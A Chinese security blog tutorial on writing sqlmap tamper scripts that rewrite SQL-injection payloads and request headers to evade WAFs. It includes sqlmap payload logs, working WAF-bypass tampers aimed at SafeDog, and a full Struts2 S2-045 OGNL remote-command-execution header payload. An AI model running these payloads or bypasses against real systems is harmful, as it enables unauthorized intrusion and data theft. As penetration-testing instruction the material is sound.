<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>如何编写Sqlmap的Tamper脚本?</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">

    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body><div class="container mt-5">
    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
          
          倾旋的博客
        </a>
        <div class="navbar-nav flex-row flex-wrap justify-content-center">
            
                
                
                    <a class="nav-item nav-link" href="/about" title="About">
                        About
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/projects/" title="Projects">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg>Projects
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/links/" title="Links">
                        Links
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/post/" title="Posts">
                        Posts
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
                        Rss
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/tools/" title="Tools">
                        Tools
                    </a>
                    
                
            
        </div>
    </nav>
</div>
<hr>
<div id="content">
<div class="container">
    <p>本文简述SQLMAP的tamper编写步骤</p>
<ul>
<li>目录
{:toc}</li>
</ul>
<h2 id="0x00-前言">0x00 前言</h2>
<p>前段时间发布了几篇Bypass的文章，包括脚本的免杀、请求分析、WAF的特性、Bypass原理&hellip;
我的微信：Guest_Killer_0nlis</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/25549356">渗透测试中的Bypass技巧（一）</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25585517">渗透测试中的Bypass技巧（二）</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25678670">自动化注入Bypass（附自动化sqlmap bypass tamper）</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25724834">自动化注入Bypass 2（附自动化sqlmap bypass tamper）</a></li>
</ul>
<p>这些文章中的亮点无非就是那两个<code>tamper</code>啦！</p>
<p>今天带大家从基本的走起：</p>
<ul>
<li>0x00 前言</li>
<li>0x01 Tamper的主要作用</li>
<li>0x02 Tamper简单结构概述</li>
<li>0x03 Tamper的几个玩法</li>
<li>0x04 最后的吐槽！</li>
</ul>
<h2 id="0x01-tamper的主要作用">0x01 Tamper的主要作用</h2>
<p>其实一个简单的Tamper能够帮助我们修改<code>Payload</code>，修改请求头中的<code>Header</code>值，从而绕过IDS/WAF的检测。</p>
<blockquote>
<p>这里的<code>Payload</code>就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上<code>-v 3</code>参数来查看<code>Payload</code>。</p>
</blockquote>
<p>它共有七个等级，默认为1：</p>
<ul>
<li>0、只显示python错误以及严重的信息。</li>
<li>1、同时显示基本信息和警告信息。（默认）</li>
<li>2、同时显示debug信息。</li>
<li>3、同时显示注入的payload。</li>
<li>4、同时显示HTTP请求。</li>
<li>5、同时显示HTTP响应头。</li>
<li>6、同时显示HTTP响应页面。</li>
</ul>
<blockquote>
<p>这里的<code>Header</code>就是我们的每一个请求头，在注入的时候我们可以加上<code>-v 4</code>参数来查看<code>Header</code>。</p>
</blockquote>
<p>在调用<code>Tamper</code>之前我们要考虑当前数据库的版本、类型，然后再去选择合理的<code>Tamper</code>。</p>
<p>假设我有一个MySQL数据库的注入点，WAF检测<code>UNION</code>关键字如果有空格，就会被当作一个SQL攻击请求，从而把你给拦截了。
那么真的就没有办法了吗？</p>
<p>在MySQL语句中，我们可以通过<code>/*!UNION*/</code>或者<code>/**/UNION/**/</code> Agian or <code>UniOn</code>&hellip;.都可以正常执行，前提是你必须了解各个数据库的特性。
就拿MySQL来说，它不区分大小写，那么我们传递的值有时候也可以通过大小写混淆的方式去绕过检测。</p>
<blockquote>
<p>这些思路都是根据一个个基础知识通过构思、一个想法而产生的，然后再通过动手去实践想法，得出结论，最后产生“姿势”。
你不缺乏想象力，你只是基础知识太弱。      - 倾旋</p>
</blockquote>
<p>那么说了这么多，其实可以总结出：调用Tamper的条件就是必须能保证我们的SQL执行后与我们的期望结果相同。
意思也就是要满足数据库能够正常运行SQL(排除报错注入)。</p>
<h2 id="0x02-tamper简单结构概述">0x02 Tamper简单结构概述</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
</span><span style="color:#e6db74">See the file &#39;doc/COPYING&#39; for copying permission
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW <span style="color:#75715e"># 当前脚本调用优先等级</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dependencies</span>(): <span style="color:#75715e"># 声明当前脚本适用/不适用的范围，可以为空。</span>
    <span style="color:#66d9ef">pass</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs): <span style="color:#75715e"># 用于篡改Payload、以及请求头的主要函数</span>
    <span style="color:#66d9ef">return</span> payload
</code></pre></div><p>今天主要来讲tamper这个函数，总共两个参数。</p>
<p><code>payload</code>主要是传递过来的是每个检测SQL注入的Payload，建议读者先找一个注入点测试并添加上<code>-v 3</code>参数，查看Payload体验一下。</p>
<blockquote>
<p>SQL Injection:http://192.168.1.149/sqli/example1.php?name=root</p>
</blockquote>
<p>部分日志：</p>
<pre><code>[14:00:27] [PAYLOAD] 5444
[14:00:27] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:27] [INFO] confirming that GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] 6230
[14:00:27] [INFO] GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] root),).&quot;&quot;)','
[14:00:27] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[14:00:27] [PAYLOAD] root'jQBnEm&lt;'&quot;&gt;IXWAcV
[14:00:27] [INFO] testing for SQL injection on GET parameter 'name'
[14:00:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:00:28] [PAYLOAD] root) AND 1494=5040 AND (7286=7286
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root) AND 6033=6033 AND (6260=6260
[14:00:28] [PAYLOAD] root AND 9786=3346
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root AND 6033=6033
[14:00:28] [PAYLOAD] root') AND 7485=8545 AND ('IUCd'='IUCd
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.634
[14:00:28] [PAYLOAD] root') AND 6033=6033 AND ('qlLE'='qlLE
[14:00:28] [PAYLOAD] root' AND 5621=6946 AND 'OKld'='OKld
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv
[14:00:28] [PAYLOAD] root' AND 9642=7321 AND 'reXb'='reXb
</code></pre><p>我们此时站在自动化检测工具的角度去分析这个注入点</p>
<p>首先判断这个参数的值是整数型还是字符型，因为在数据库中，要进行条件匹配、逻辑运算的话，字符是要被双引号包裹起来的，而整数不用。</p>
<h3 id="example">Example：</h3>
<blockquote>
<p>SELECT * FROM user WHERE username = &lsquo;root&rsquo;
SELECT * FROM user WHERE uid = 1
SELECT * FROM user WHERE uid =&lsquo;1&rsquo; # 数字字符遇到整数型字段会被自动转换</p>
</blockquote>
<p>再看这一条：<code>[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv</code>，此时已经完全符合我们的要求了。
SQL语句如下：<code>SELECT * FROM user WHERE username='root' AND 6033=6033 AND 'HFDv'='HFDv'</code></p>
<blockquote>
<p>如果还不理解，你就要去看手工注入的知识了，没必要再向下阅读了。</p>
</blockquote>
<h2 id="0x03-tamper的几个玩法">0x03 Tamper的几个玩法</h2>
<p>到了重头戏了，我们来自己写几个Tamper，然后去分析我之前写过的Tamper，还是很好理解的！</p>
<p>本文中涉及的技术并没有多么深，你只需要有手工注入的基础、Python的字符串简单操作即可写出自己的Tamper。</p>
<p>首先举个例子，假设我们有一个加工厂，这个加工厂的产品需要经过三个流程，<code>进货</code>、<code>加工</code>、<code>包装</code>、<code>出售</code>。但是我们的货物我们不需要去包装就可以直接出售给客户。</p>
<blockquote>
<p>这里的货物就是我们的SQL注入点，你可以把它当作一个向服务器端发送的请求。</p>
</blockquote>
<blockquote>
<p>这个进货的操作就是我们将检测目标传递给自动化注入工具的过程了。</p>
</blockquote>
<blockquote>
<p>加工就是自动化注入工具进行分析、构造合适的Payload。</p>
</blockquote>
<blockquote>
<p>假设这个货物要被包装才可以出售(调用了 &ndash;tamper参数)，那么我们的加工材料(Payload)就会经过我们的包装车间(tamper函数),为了兼容不同的产品，所以根据产品的个数设立了可变的车间(payload参数和**kwargs参数)。</p>
</blockquote>
<blockquote>
<p>最后的出售就是将加工好的产品(请求)卖给客户(存在注入点的服务器)。</p>
</blockquote>
<p>整个tamper的作用就在这里，用于判断是否需要包装。</p>
<p>下面我根据刚才这个例子来写一个简单的包装车间(tamper)：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
</span><span style="color:#e6db74">See the file &#39;doc/COPYING&#39; for copying permission
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY

__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dependencies</span>():
    <span style="color:#66d9ef">pass</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):<span style="color:#75715e"># tamper函数体内你可以把payload和kwargs当作已经传递进来的值</span>
    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#34;/**/&#34;</span>) <span style="color:#75715e"># 将空格替换为/**/</span>
    print payload <span style="color:#75715e">#适当的还可以直接输出，不使用-v参数了。</span>
    <span style="color:#66d9ef">return</span> payload <span style="color:#75715e">#必须返回最后的Payload</span>
</code></pre></div><p>我们将上面的代码保存为tamperdeomo.py放到sqlmap的tamper目录中。
然后试着调用这个脚本</p>
<blockquote>
<p>sqlmap -u http://192.168.1.149/sqli/example1.php?name=root &ndash;tamper=tamperdemo</p>
</blockquote>
<p>是不是很简单呢？</p>
<p>我们的第一个Tamper就大功告成了，可惜的是sqlmap官方提供的tamper中已经有了我们刚才写的功能，并且WAF大多没有那么低的level。</p>
<p>想要提升我们tamper的杀伤力和Level，首先你要了解Http相关的基础知识，以及正则表达式。</p>
<p>总之万变不离其宗，我们只要在最后返回Payload的值就可以了。</p>
<p>另一种玩法就是将我们请求的Header头进行一下篡改：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
</span><span style="color:#e6db74">See the file &#39;doc/COPYING&#39; for copying permission
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY

__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dependencies</span>():
    <span style="color:#66d9ef">pass</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):
    kwargs[<span style="color:#e6db74">&#39;headers&#39;</span>][<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> <span style="color:#75715e"># 这里的kwargs是一个字典，读者可以直接print打印出来看看结构。</span>
    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#39;/**/&#39;</span>)
    <span style="color:#66d9ef">return</span> payload
</code></pre></div><p>经常看HTTP数据包的读者肯定注意到了，kwargs[&lsquo;headers&rsquo;]对应我们的请求Header头，它是一个字典。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">kwargs[<span style="color:#e6db74">&#39;headers&#39;</span>][<span style="color:#e6db74">&#39;Content-type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&#34;</span><span style="color:#f92672">+</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&#34;</span>

kwargs[<span style="color:#e6db74">&#39;headers&#39;</span>][<span style="color:#e6db74">&#39;User-Agent&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#34;</span> <span style="color:#75715e"># 修改User-Agent</span>
</code></pre></div><p>也可以这么来执行<code>S2-045</code>……</p>
<p>当然也可以<code>import</code>其他模块进行操作，随心所欲 ～</p>
<p>下面分析我之前分享出来的两个bypass脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload,<span style="color:#f92672">**</span>kwargs):
    <span style="color:#66d9ef">if</span> payload:
		bypass_SafeDog_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*x^x*/&#34;</span> <span style="color:#75715e"># 一个干扰字符</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UNION&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;UNION&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str) <span style="color:#75715e"># 在UNION的左右两边添加干扰字符</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SELECT&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;SELECT&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str) <span style="color:#75715e"># 同上，</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;AND&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;AND&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str) <span style="color:#75715e"># 同上，</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;=&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str) <span style="color:#75715e"># 将空格替换成干扰字符</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,bypass_SafeDog_str)
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;information_schema.&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*!</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20INFOrMATION_SCHEMa</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20*/</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/&#34;</span>) <span style="color:#75715e"># 将information_schema.这个关键字替换成URL编码后的内容</span>
		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;FROM&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;FROM&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str) <span style="color:#75715e"># 同样替换</span>
		<span style="color:#75715e">#print &#34;[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version .&#34;</span>
		print payload <span style="color:#75715e"># 输出Payload </span>
    <span style="color:#66d9ef">return</span> payload <span style="color:#75715e"># 返回Payload</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">import</span> re
<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
    <span style="color:#66d9ef">if</span> payload:
              <span style="color:#66d9ef">pass</span>
              payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SLEEP(5)&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> LikE Sleep(5)&#34;</span>) <span style="color:#75715e"># 将SLEEP(5)替换成&#34;0&#34; LIKE Sleep(5)，因为Sleep()函数执行后会返回0，0等于0就会返回true</span>
       	      payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;/*FFFFFFFFFFFFFFFFFFFFFFFFF*/&#34;</span>) <span style="color:#75715e"># 将空格替换</span>
              p <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;(\d+)=&#39;</span>)
              payload<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#39;\1&#39;LikE &#34;</span>, payload) <span style="color:#75715e">#将数字附近的=替换成LikE</span>
    <span style="color:#66d9ef">return</span> payload <span style="color:#75715e"># 返回payload</span>
</code></pre></div><h2 id="0x04-最后的吐槽">0x04 最后的吐槽！</h2>
<p>看了这么多例子，你是否有所收获呢？</p>
<p>因为在某社区看到有人高价出售tamper、过狗一句话……讲真，我看不起这种行为。</p>
<p>在挖掘防护产品有缺陷的时候请不要感觉自己多么厉害，也许是运气、偶然、实力。</p>
<p>不管以任何方式，都不能忘记初心。</p>
<p>每一个漏洞的公布，都会给这个时代的技术发展画上浓重的一笔。</p>
<p>再此，感谢云锁、安全狗在职的朋友们的鼓励与支持。</p>
</div>

        </div><div id="footer" class="mb-5">
    <hr>
    <div class="container text-center">
        
            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
        
            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
        
    </div>
    
        <div class="container text-center">
            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
        </div>
    
</div>



<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
